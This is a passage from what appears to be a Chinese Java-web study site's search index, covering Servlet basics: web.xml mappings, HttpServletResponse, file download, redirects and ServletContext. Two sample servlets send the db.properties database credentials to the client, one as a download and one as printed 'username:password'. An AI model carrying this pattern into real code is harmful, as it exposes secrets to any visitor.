url-pattern\u8fd8\u5b58\u5728\u4f18\u5148\u7ea7\uff0c\u8d8a\u7cbe\u51c6\u7684pattern\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u8d8a\u6a21\u7cca\u7684pattern\u4f18\u5148\u7ea7\u8d8a\u4f4e\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528/*\u8fd9\u4e2apattern\u6765\u81ea\u5b9a\u4e49404\u754c\u9762\u3002 \u4e00\u4e2aservlet\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u6620\u5c04\u8def\u5f84\u3002 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > <!-- \u6ce8\u518cservlet --> <servlet> <servlet-name> hello </servlet-name> <servlet-class> top.longlone.servlet.HelloServlet </servlet-class> </servlet> <!-- \u8bbe\u7f6eservlet\u6620\u5c04 --> <servlet-mapping> <servlet-name> hello </servlet-name> <!-- \u8fd9\u91ccurl-pattern\u53ef\u4ee5\u4f7f\u7528*\u901a\u914d\u7b26\uff0c\u4f46\u662f\u53ea\u80fd\u6709\u4e24\u79cd\u683c\u5f0f \u4e00\u662f*.\u6269\u5c55\u540d \u4e8c\u662f\u4ee5/\u5f00\u5934\uff0c*\u7ed3\u5c3e --> <url-pattern> /hello </url-pattern> </servlet-mapping> </web-app > 4. \u542f\u52a8tomcat\u670d\u52a1\u5668\uff0c\u8bbf\u95ee/hello","title":"\u7b80\u5355\u793a\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/web/HelloServlet/#servlet\u4e0etomcat\u5de5\u4f5c\u539f\u7406","text":"Web Client \u5411Servlet\u5bb9\u5668\uff08Tomcat\uff09\u53d1\u51faHttp\u8bf7\u6c42 Servlet\u5bb9\u5668\u63a5\u6536Web Client\u7684\u8bf7\u6c42 Servlet\u5bb9\u5668\u521b\u5efa\u4e00\u4e2aHttpRequest\u5bf9\u8c61\uff0c\u5c06Web Client\u8bf7\u6c42\u7684\u4fe1\u606f\u5c01\u88c5\u5230\u8fd9\u4e2a\u5bf9\u8c61\u4e2d\u3002 Servlet\u5bb9\u5668\u521b\u5efa\u4e00\u4e2aHttpResponse\u5bf9\u8c61 Servlet\u5bb9\u5668\u8c03\u7528HttpServlet\u5bf9\u8c61\u7684service\u65b9\u6cd5\uff0c\u628aHttpRequest\u5bf9\u8c61\u4e0eHttpResponse\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u7ed9 HttpServlet \u5bf9\u8c61\u3002 HttpServlet\u8c03\u7528HttpRequest\u5bf9\u8c61\u7684\u6709\u5173\u65b9\u6cd5\uff0c\u83b7\u53d6Http\u8bf7\u6c42\u4fe1\u606f\u3002 HttpServlet\u8c03\u7528HttpResponse\u5bf9\u8c61\u7684\u6709\u5173\u65b9\u6cd5\uff0c\u751f\u6210\u54cd\u5e94\u6570\u636e\u3002 Servlet\u5bb9\u5668\u628aHttpServlet\u7684\u54cd\u5e94\u7ed3\u679c\u4f20\u7ed9Web Client\u3002","title":"Servlet\u4e0eTomcat\u5de5\u4f5c\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/","text":"HttpServletResponse # web\u670d\u52a1\u5668\u63a5\u6536\u5230\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u540e\uff0c\u4f1a\u5c01\u88c5\u4e00\u4e2aHttpServletRequest\u548cHttpServletResponse HttpServletResponse\u4e2d\u7684\u65b9\u6cd5 # \u83b7\u53d6\u8f93\u51fa\u54cd\u5e94\u5bf9\u8c61 # public ServletOutputStream getOutputStream () throws IOException ; public PrintWriter getWriter () throws IOException ; \u8bbe\u7f6e\u54cd\u5e94\u4fe1\u606f # public void setCharacterEncoding ( String charset ); public void setContentLength ( int len ); public void setContentLengthLong ( long len ); public void setContentType ( String type ); public void addCookie ( Cookie cookie ); public void setDateHeader ( String name , long date ); public void addDateHeader ( String name , long date ); public void setHeader ( String name , String value ); public void addHeader ( String name , String value ); public void setIntHeader ( String name , int value ); public void addIntHeader ( String name , int value ); public void setStatus ( int sc ); public void sendError ( int sc , String msg ) throws IOException ; public void sendRedirect ( String location ) throws IOException ; \u83b7\u53d6\u54cd\u5e94\u4fe1\u606f # public int getStatus (); public String getHeader ( String name ); public Collection < String > getHeaders ( String name ); public Collection < String > getHeaderNames (); public String getCharacterEncoding (); public String getContentType (); \u5176\u4ed6 # public String encodeURL ( String url ); public String encodeRedirectURL ( String url ); \u5e38\u89c1\u5e94\u7528 # \u8f93\u51fa\u54cd\u5e94\u672c\u4f53 # \u4f7f\u7528 getOutputStream \u6216 getWriter \u83b7\u53d6\u8f93\u51fa\u54cd\u5e94\u5bf9\u8c61\u4e4b\u540e\u5c31\u53ef\u4ee5\u8f93\u51fa\u54cd\u5e94\u672c\u4f53\u4e86\u3002 \u4e0b\u8f7d\u6587\u4ef6 # \u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8def\u5f84\u548c\u6587\u4ef6\u540d \u8bbe\u7f6e\u54cd\u5e94\u5934 \u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8f93\u5165\u6d41\u548cOutputStream\u5bf9\u8c61 \u521b\u5efabuffer\u7f13\u51b2\u533a \u5c06FileOutputStream\u6d41\u5199\u5165buffer\u7f13\u51b2\u533a\uff0c\u518d\u5c06\u5176\u8f93\u51fa\u5230\u5ba2\u6237\u7aef package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.ServletOutputStream ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.File ; import java.io.FileInputStream ; import java.io.IOException ; import java.io.PrintWriter ; import java.net.URLEncoder ; public class DownloadServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { // \u83b7\u53d6\u8d44\u6e90\u6587\u4ef6\u8def\u5f84 String filepath = this . getServletContext (). getRealPath ( \"/WEB-INF/classes/db.properties\" ); // \u83b7\u53d6\u6587\u4ef6\u540d File file = new File ( filepath ); String fileName = file . getName (); // \u8bbe\u7f6e\u54cd\u5e94\u5934\uff0c\u8fd9\u91cc\u8981\u5c06filename\u7f16\u7801\u4e00\u4e0b\u4ee5\u652f\u6301\u4e2d\u6587\u540d resp . setHeader ( \"Content-Disposition\" , \"attachment;filename=\" + URLEncoder . encode ( fileName , \"UTF-8\" )); resp . setHeader ( \"Content-Length\" , String . valueOf ( file . length ())); // \u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8f93\u5165\u6d41\u548cOutputStream\u5bf9\u8c61 FileInputStream fis = new FileInputStream ( filepath ); ServletOutputStream outputStream = resp . getOutputStream (); // \u521b\u5efabuffer\u7f13\u51b2\u533a int len = 0 ; byte [] buffer = new byte [ 1024 ] ; // \u5c06FileOutputStream\u6d41\u5199\u5165buffer\u7f13\u51b2\u533a\uff0c\u518d\u5c06\u5176\u8f93\u51fa\u5230\u5ba2\u6237\u7aef while (( len = fis . read ( buffer )) != - 1 ) { outputStream . write ( buffer , 0 , len ); } fis . close (); outputStream . close (); } } \u91cd\u5b9a\u5411 # package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class RedirectServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { /* \u7b49\u4ef7\u4e8e\u4e0b\u9762\u7684\u65b9\u5f0f resp.setHeader(\"Location\", \"/servlet_01/hello\"); resp.setStatus(302); */ resp . sendRedirect ( \"/servlet_01/hello\" ); } } \u91cd\u5b9a\u5411\u548c\u8f6c\u53d1\u7684\u533a\u522b # \u91cd\u5b9a\u5411 \u8f6c\u53d1 \u8f6c\u53d1\u662f\u5728\u670d\u52a1\u5668\u7aef\u5b8c\u6210\u7684\uff0c\u91cd\u5b9a\u5411\u662f\u5728\u5ba2\u6237\u7aef\u53d1\u751f\u7684\uff1b \u8f6c\u53d1\u7684\u901f\u5ea6\u5feb\uff0c\u91cd\u5b9a\u5411\u901f\u5ea6\u6162\uff1b \u8f6c\u53d1\u662f\u540c\u4e00\u6b21\u8bf7\u6c42\uff0c\u91cd\u5b9a\u5411\u662f\u4e24\u6b21\u8bf7\u6c42\uff1b \u8f6c\u53d1\u5730\u5740\u680f\u6ca1\u6709\u53d8\u5316\uff0c\u91cd\u5b9a\u5411\u5730\u5740\u680f\u6709\u53d8\u5316\uff1b \u8f6c\u53d1\u5fc5\u987b\u662f\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0b\u5b8c\u6210\uff0c\u91cd\u5b9a\u5411\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u670d\u52a1\u5668\u4e0b\u5b8c\u6210\u3002","title":"HttpServletResponse"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#httpservletresponse","text":"web\u670d\u52a1\u5668\u63a5\u6536\u5230\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u540e\uff0c\u4f1a\u5c01\u88c5\u4e00\u4e2aHttpServletRequest\u548cHttpServletResponse","title":"HttpServletResponse"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#httpservletresponse\u4e2d\u7684\u65b9\u6cd5","text":"","title":"HttpServletResponse\u4e2d\u7684\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u83b7\u53d6\u8f93\u51fa\u54cd\u5e94\u5bf9\u8c61","text":"public ServletOutputStream getOutputStream () throws IOException ; public PrintWriter getWriter () throws IOException ;","title":"\u83b7\u53d6\u8f93\u51fa\u54cd\u5e94\u5bf9\u8c61"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u8bbe\u7f6e\u54cd\u5e94\u4fe1\u606f","text":"public void setCharacterEncoding ( String charset ); public void setContentLength ( int len ); public void setContentLengthLong ( long len ); public void setContentType ( String type ); public void addCookie ( Cookie cookie ); public void setDateHeader ( String name , long date ); public void addDateHeader ( String name , long date ); public void setHeader ( String name , String value ); public void addHeader ( String name , String value ); public void setIntHeader ( String name , int value ); public void addIntHeader ( String name , int value ); public void setStatus ( int sc ); public void sendError ( int sc , String msg ) throws IOException ; public void sendRedirect ( String location ) throws IOException ;","title":"\u8bbe\u7f6e\u54cd\u5e94\u4fe1\u606f"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u83b7\u53d6\u54cd\u5e94\u4fe1\u606f","text":"public int getStatus (); public String getHeader ( String name ); public Collection < String > getHeaders ( String name ); public Collection < String > getHeaderNames (); public String getCharacterEncoding (); public String getContentType ();","title":"\u83b7\u53d6\u54cd\u5e94\u4fe1\u606f"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u5176\u4ed6","text":"public String encodeURL ( String url ); public String encodeRedirectURL ( String url );","title":"\u5176\u4ed6"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u5e38\u89c1\u5e94\u7528","text":"","title":"\u5e38\u89c1\u5e94\u7528"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u8f93\u51fa\u54cd\u5e94\u672c\u4f53","text":"\u4f7f\u7528 getOutputStream \u6216 getWriter \u83b7\u53d6\u8f93\u51fa\u54cd\u5e94\u5bf9\u8c61\u4e4b\u540e\u5c31\u53ef\u4ee5\u8f93\u51fa\u54cd\u5e94\u672c\u4f53\u4e86\u3002","title":"\u8f93\u51fa\u54cd\u5e94\u672c\u4f53"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u4e0b\u8f7d\u6587\u4ef6","text":"\u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8def\u5f84\u548c\u6587\u4ef6\u540d \u8bbe\u7f6e\u54cd\u5e94\u5934 \u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8f93\u5165\u6d41\u548cOutputStream\u5bf9\u8c61 \u521b\u5efabuffer\u7f13\u51b2\u533a \u5c06FileOutputStream\u6d41\u5199\u5165buffer\u7f13\u51b2\u533a\uff0c\u518d\u5c06\u5176\u8f93\u51fa\u5230\u5ba2\u6237\u7aef package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.ServletOutputStream ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.File ; import java.io.FileInputStream ; import java.io.IOException ; import java.io.PrintWriter ; import java.net.URLEncoder ; public class DownloadServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { // \u83b7\u53d6\u8d44\u6e90\u6587\u4ef6\u8def\u5f84 String filepath = this . getServletContext (). getRealPath ( \"/WEB-INF/classes/db.properties\" ); // \u83b7\u53d6\u6587\u4ef6\u540d File file = new File ( filepath ); String fileName = file . getName (); // \u8bbe\u7f6e\u54cd\u5e94\u5934\uff0c\u8fd9\u91cc\u8981\u5c06filename\u7f16\u7801\u4e00\u4e0b\u4ee5\u652f\u6301\u4e2d\u6587\u540d resp . setHeader ( \"Content-Disposition\" , \"attachment;filename=\" + URLEncoder . encode ( fileName , \"UTF-8\" )); resp . setHeader ( \"Content-Length\" , String . valueOf ( file . length ())); // \u83b7\u53d6\u4e0b\u8f7d\u6587\u4ef6\u8f93\u5165\u6d41\u548cOutputStream\u5bf9\u8c61 FileInputStream fis = new FileInputStream ( filepath ); ServletOutputStream outputStream = resp . getOutputStream (); // \u521b\u5efabuffer\u7f13\u51b2\u533a int len = 0 ; byte [] buffer = new byte [ 1024 ] ; // \u5c06FileOutputStream\u6d41\u5199\u5165buffer\u7f13\u51b2\u533a\uff0c\u518d\u5c06\u5176\u8f93\u51fa\u5230\u5ba2\u6237\u7aef while (( len = fis . read ( buffer )) != - 1 ) { outputStream . write ( buffer , 0 , len ); } fis . close (); outputStream . close (); } }","title":"\u4e0b\u8f7d\u6587\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u91cd\u5b9a\u5411","text":"package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class RedirectServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { /* \u7b49\u4ef7\u4e8e\u4e0b\u9762\u7684\u65b9\u5f0f resp.setHeader(\"Location\", \"/servlet_01/hello\"); resp.setStatus(302); */ resp . sendRedirect ( \"/servlet_01/hello\" ); } }","title":"\u91cd\u5b9a\u5411"},{"location":"%E5%AE%89%E5%85%A8/java/web/HttpServletResponse/#\u91cd\u5b9a\u5411\u548c\u8f6c\u53d1\u7684\u533a\u522b","text":"\u91cd\u5b9a\u5411 \u8f6c\u53d1 \u8f6c\u53d1\u662f\u5728\u670d\u52a1\u5668\u7aef\u5b8c\u6210\u7684\uff0c\u91cd\u5b9a\u5411\u662f\u5728\u5ba2\u6237\u7aef\u53d1\u751f\u7684\uff1b \u8f6c\u53d1\u7684\u901f\u5ea6\u5feb\uff0c\u91cd\u5b9a\u5411\u901f\u5ea6\u6162\uff1b \u8f6c\u53d1\u662f\u540c\u4e00\u6b21\u8bf7\u6c42\uff0c\u91cd\u5b9a\u5411\u662f\u4e24\u6b21\u8bf7\u6c42\uff1b \u8f6c\u53d1\u5730\u5740\u680f\u6ca1\u6709\u53d8\u5316\uff0c\u91cd\u5b9a\u5411\u5730\u5740\u680f\u6709\u53d8\u5316\uff1b \u8f6c\u53d1\u5fc5\u987b\u662f\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0b\u5b8c\u6210\uff0c\u91cd\u5b9a\u5411\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u670d\u52a1\u5668\u4e0b\u5b8c\u6210\u3002","title":"\u91cd\u5b9a\u5411\u548c\u8f6c\u53d1\u7684\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/","text":"ServletContext # ServletContext\uff0cServlet\u7684\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0cweb\u5bb9\u5668\u5728\u542f\u52a8\u7684\u65f6\u5019,\u5b83\u4f1a\u4e3a\u6bcf\u4e2aweb\u7a0b\u5e8f\u90fd\u521b\u5efa\u4e00\u4e2a\u5bf9\u5e94\u7684 Servletcontext\u5bf9\u8c61,\u5b83\u4ee3\u8868\u4e86\u5f53\u524d\u7684web\u5e94\u7528; ServletContext\u7684\u4f5c\u7528 # \u5171\u4eab\u6570\u636e # package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String username = \"Longlone\" ; context . setAttribute ( \"username\" , username ); PrintWriter writer = resp . getWriter (); writer . print ( \"Hello,\" + username ); } } package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class WelcomeServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String username = ( String ) context . getAttribute ( \"username\" ); PrintWriter writer = resp . getWriter (); writer . print ( \"Welcome,\" + username ); } } \u5728HelloServlet\u4e2d\u4f7f\u7528ServletContext\u4fdd\u5b58\u7684\u6570\u636e\u53ef\u4ee5\u5728WelcomeServlet\u4e2d\u62ff\u5230\uff0c\u8fd9\u6837Servlet\u4e4b\u95f4\u5c31\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5171\u4eab\u6570\u636e \u914d\u7f6e\u6587\u4ef6 # \u5728web.xml\u4e2d\u53ef\u4ee5\u8bbe\u7f6econtext-param <context-param> <param-name> databaseUrl </param-name> <param-value> jdbc:mysql://localhost:3306/mybatis </param-value> </context-param> \u7136\u540e\u5728ServletContext\u4e2d\u53ef\u4ee5\u8c03\u7528getInitParameter\u65b9\u6cd5\u62ff\u5230 package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class GetServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String databaseUrl = ( String ) context . getInitParameter ( \"databaseUrl\" ); PrintWriter writer = resp . getWriter (); writer . print ( \"Database Url: \" + databaseUrl ); } } \u6240\u4ee5ServletContext\u4e5f\u53ef\u4ee5\u5145\u5f53\u4e00\u4e2a\u914d\u7f6e\u7c7b\uff0c\u53bb\u83b7\u53d6web.xml\u4e2d\u7684\u914d\u7f6e \u8bf7\u6c42\u8f6c\u53d1 # ServletContext\u4e5f\u53ef\u4ee5\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u53e6\u5916\u4e00\u4e2a\u8bf7\u6c42\u4e0a package top.longlone.servlet ; import javax.servlet.RequestDispatcher ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class ForwardServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); RequestDispatcher requestDispatcher = context . getRequestDispatcher ( \"/get\" ); requestDispatcher . forward ( req , resp ); } } \u4f8b\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5f53\u8bbf\u95eeForwardServlet\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230/get\u5bf9\u5e94\u7684GetServlet\u4e2d\uff0c\u54cd\u5e94\u7684\u5185\u5bb9\u81ea\u7136\u4e5f\u662fGetServlet\u7684\u54cd\u5e94 \u8bfb\u53d6\u8d44\u6e90\u6587\u4ef6 # \u5728resources\u6587\u4ef6\u5939\u4e2d\u5199\u5165db.properties username = root password = 123456 \u5f53tomcat\u542f\u52a8\u65f6\uff0cresources\u6587\u4ef6\u5939\u91cc\u7684\u6587\u4ef6\u5c06\u4f1a\u88ab\u6253\u5305\u5230\u9879\u76ee\u540d/WEB-INF/classes\u91cc \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7ServletContext\u83b7\u53d6\u8fd9\u4e2a\u8d44\u6e90\u6d41\uff0c\u7136\u540e\u4f7f\u7528Properties\u7c7b\u52a0\u8f7d\u8fd9\u4e2a\u8d44\u6e90\u6587\u4ef6 package top.longlone.servlet ; import javax.servlet.RequestDispatcher ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.InputStream ; import java.util.Properties ; public class ResourceServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); InputStream is = context . getResourceAsStream ( \"/WEB-INF/classes/db.properties\" ); Properties properties = new Properties (); properties . load ( is ); String usernanme = properties . getProperty ( \"username\" ); String password = properties . getProperty ( \"password\" ); resp . getWriter (). print ( usernanme + \":\" + password ); } }","title":"ServletContext"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#servletcontext","text":"ServletContext\uff0cServlet\u7684\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0cweb\u5bb9\u5668\u5728\u542f\u52a8\u7684\u65f6\u5019,\u5b83\u4f1a\u4e3a\u6bcf\u4e2aweb\u7a0b\u5e8f\u90fd\u521b\u5efa\u4e00\u4e2a\u5bf9\u5e94\u7684 Servletcontext\u5bf9\u8c61,\u5b83\u4ee3\u8868\u4e86\u5f53\u524d\u7684web\u5e94\u7528;","title":"ServletContext"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#servletcontext\u7684\u4f5c\u7528","text":"","title":"ServletContext\u7684\u4f5c\u7528"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#\u5171\u4eab\u6570\u636e","text":"package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String username = \"Longlone\" ; context . setAttribute ( \"username\" , username ); PrintWriter writer = resp . getWriter (); writer . print ( \"Hello,\" + username ); } } package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class WelcomeServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String username = ( String ) context . getAttribute ( \"username\" ); PrintWriter writer = resp . getWriter (); writer . print ( \"Welcome,\" + username ); } } \u5728HelloServlet\u4e2d\u4f7f\u7528ServletContext\u4fdd\u5b58\u7684\u6570\u636e\u53ef\u4ee5\u5728WelcomeServlet\u4e2d\u62ff\u5230\uff0c\u8fd9\u6837Servlet\u4e4b\u95f4\u5c31\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5171\u4eab\u6570\u636e","title":"\u5171\u4eab\u6570\u636e"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#\u914d\u7f6e\u6587\u4ef6","text":"\u5728web.xml\u4e2d\u53ef\u4ee5\u8bbe\u7f6econtext-param <context-param> <param-name> databaseUrl </param-name> <param-value> jdbc:mysql://localhost:3306/mybatis </param-value> </context-param> \u7136\u540e\u5728ServletContext\u4e2d\u53ef\u4ee5\u8c03\u7528getInitParameter\u65b9\u6cd5\u62ff\u5230 package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class GetServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String databaseUrl = ( String ) context . getInitParameter ( \"databaseUrl\" ); PrintWriter writer = resp . getWriter (); writer . print ( \"Database Url: \" + databaseUrl ); } } \u6240\u4ee5ServletContext\u4e5f\u53ef\u4ee5\u5145\u5f53\u4e00\u4e2a\u914d\u7f6e\u7c7b\uff0c\u53bb\u83b7\u53d6web.xml\u4e2d\u7684\u914d\u7f6e","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#\u8bf7\u6c42\u8f6c\u53d1","text":"ServletContext\u4e5f\u53ef\u4ee5\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u53e6\u5916\u4e00\u4e2a\u8bf7\u6c42\u4e0a package top.longlone.servlet ; import javax.servlet.RequestDispatcher ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class ForwardServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); RequestDispatcher requestDispatcher = context . getRequestDispatcher ( \"/get\" ); requestDispatcher . forward ( req , resp ); } } \u4f8b\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5f53\u8bbf\u95eeForwardServlet\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230/get\u5bf9\u5e94\u7684GetServlet\u4e2d\uff0c\u54cd\u5e94\u7684\u5185\u5bb9\u81ea\u7136\u4e5f\u662fGetServlet\u7684\u54cd\u5e94","title":"\u8bf7\u6c42\u8f6c\u53d1"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#\u8bfb\u53d6\u8d44\u6e90\u6587\u4ef6","text":"\u5728resources\u6587\u4ef6\u5939\u4e2d\u5199\u5165db.properties username = root password = 123456 \u5f53tomcat\u542f\u52a8\u65f6\uff0cresources\u6587\u4ef6\u5939\u91cc\u7684\u6587\u4ef6\u5c06\u4f1a\u88ab\u6253\u5305\u5230\u9879\u76ee\u540d/WEB-INF/classes\u91cc \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7ServletContext\u83b7\u53d6\u8fd9\u4e2a\u8d44\u6e90\u6d41\uff0c\u7136\u540e\u4f7f\u7528Properties\u7c7b\u52a0\u8f7d\u8fd9\u4e2a\u8d44\u6e90\u6587\u4ef6 package top.longlone.servlet ; import javax.servlet.RequestDispatcher ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.InputStream ; import java.util.Properties ; public class ResourceServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); InputStream is = context . getResourceAsStream ( \"/WEB-INF/classes/db.properties\" ); Properties properties = new Properties (); properties . load ( is ); String usernanme = properties . getProperty ( \"username\" ); String password = properties . getProperty ( \"password\" ); resp . getWriter (). print ( usernanme + \":\" + password ); } }","title":"\u8bfb\u53d6\u8d44\u6e90\u6587\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/","text":"Tomcat # tomcat\u5b98\u7f51 \u5b89\u88c5tomcat # \u76f4\u63a5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u7136\u540e\u5b89\u88c5\uff0c\u6216\u8005\u4f7f\u7528\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\u3002 \u542f\u52a8\uff0c\u5173\u95edTomcat # \u5728Tomcat/bin\u76ee\u5f55\u4e2d\u6709startup.sh/startup.bat\u811a\u672c\u7528\u4e8e\u542f\u52a8Tomcat\uff0cTomcat\u542f\u52a8\u540e\u9ed8\u8ba4\u5f00\u542f\u5728 http://127.0.0.1:8080 \u5728Tomcat/bin\u76ee\u5f55\u4e2d\u6709shutdown.sh/shutdown.bat\u811a\u672c\u7528\u4e8e\u5173\u95edTomcat Tomcat\u914d\u7f6e # 